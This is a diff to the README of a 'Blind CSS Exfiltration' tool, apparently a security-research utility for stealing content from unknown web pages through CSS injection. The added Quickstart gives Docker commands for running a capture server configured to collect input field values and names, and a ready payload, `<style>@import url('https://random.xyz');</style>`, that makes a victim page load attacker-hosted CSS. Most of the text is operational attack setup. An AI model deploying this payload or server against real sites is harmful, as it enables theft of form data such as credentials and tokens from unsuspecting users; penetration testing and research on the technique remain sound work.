@@ -1,6 +1,13 @@
 # Blind CSS Exfiltration
 # Exfiltrate unknown web pages
 
+## Quickstart
+
+1. Replace `random.xyz` with your domain in `Caddyfile`.
+2. Build image `docker build -t css-exfiltrator .`
+3. Run `docker run --rm -p 80:80 -p 443:443 -e HOSTNAME="https://random.xyz" -e ATTRIBUTES='{"input":["value","name"]}' -e SHOW_RESULTS_IN_BROWSER=false --name css-exfiltrator -v $(pwd):/data css-exfiltrator`
+4. Send payload `<style>@import url("https://random.xyz");</style>`
+
 ## Using the exfiltrator
 To run your own version of the exfiltrator you need to first grab the source code from above and then run it using node:
 node css-exfiltrator-server.js
